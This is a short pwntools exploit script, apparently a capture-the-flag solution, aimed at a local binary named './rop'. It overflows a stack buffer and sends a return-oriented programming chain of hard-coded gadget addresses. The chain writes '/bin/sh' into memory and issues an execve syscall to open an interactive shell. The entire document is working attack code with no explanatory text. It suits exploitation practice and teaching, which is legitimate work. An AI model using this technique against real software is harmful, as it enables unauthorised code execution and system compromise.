from pwn import *

r = process('./rop')

raw_input()

pop_rdi = 0x0000000000400686 #pop rdi ; ret
pop_rsi = 0x0000000000410093 #pop rxi ; ret
pop_rdx = 0x00000000004494b5 #pop rdx ; ret
pop_rax = 0x0000000000415294 #pop rax ; ret
mov_qword_rdi_rsi = 0x0000000000446c1b #mov qword ptr [rdi], rsi ; ret
syscall = 0x00000000004011fc # syscall
bss = 0x00000000006bb2e0

payload = 'a' * 0x18
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += '/bin/sh\x00'
payload += p64(mov_qword_rdi_rsi)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(syscall)

r.recvuntil(';)\n')
r.send(payload)

r.interactive()
